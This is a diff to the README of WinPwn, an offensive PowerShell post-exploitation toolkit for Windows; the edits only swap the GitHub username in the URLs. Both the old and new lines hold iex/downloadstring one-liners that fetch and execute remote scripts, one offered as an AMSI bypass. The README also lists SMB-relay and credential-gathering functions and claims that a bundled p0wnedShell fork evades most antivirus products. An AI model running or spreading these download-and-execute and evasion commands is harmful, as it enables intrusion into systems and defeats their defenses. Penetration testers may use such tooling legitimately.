@@ -8,17 +8,17 @@ Any suggestions, feedback, Pull requests and comments are welcome!
 
 Just Import the Modules with:
 `Import-Module .\WinPwn.ps1` or 
-`iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/WinPwn.ps1')`
+`iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1')`
 
 For AMSI Bypass use the following oneliner:
-`iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/ObfusWinPwn.ps1')`
+`iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/ObfusWinPwn.ps1')`
 
 
 If you find yourself stuck on a windows system with no internet access - no problem at all, just use Offline_Winpwn.ps1, all scripts and executables are included.
 
 Functions available after Import:
 * #### `WinPwn` -> Menu to choose attacks:
-![alt text](https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/WinPwn.jpg)
+![alt text](https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.jpg)
 * #### `Inveigh` -> Executes Inveigh in a new Console window , SMB-Relay attacks with Session management (Invoke-TheHash) integrated
 * #### `sessionGopher` -> Executes Sessiongopher Asking you for parameters
 * #### `kittielocal` ->
@@ -63,15 +63,15 @@ Functions available after Import:
 
 The submodule is a forked and edited version of https://github.com/Cn33liz/p0wnedShell. You can compile it yourself and use it for powershell restriction bypass and AMSI-Bypass. Most AV-Solutions can be evaded this way. Just run the executable File, choose 17. and execute WinPwn.
 
-![alt text](https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/p0wnedmenu.PNG)
+![alt text](https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/p0wnedmenu.PNG)
 
-![alt text](https://raw.githubusercontent.com/SecureThisShit/WinPwn/master/p0wned.png)
+![alt text](https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/p0wned.png)
 
 ## TO-DO
 - [x] Some obfuskation
 - [ ] More obfuscation
 - [ ] Proxy via PAC-File support
-- [x] Get the scripts from my own creds repository (https://github.com/SecureThisShit/Creds) to be independent from changes in the original repositories
+- [x] Get the scripts from my own creds repository (https://github.com/S3cur3Th1sSh1t/Creds) to be independent from changes in the original repositories
 - [ ] More Recon/Exploitation functions
 - [x] Add MS17-10 Scanner
 - [x] Add menu for better handling of functions
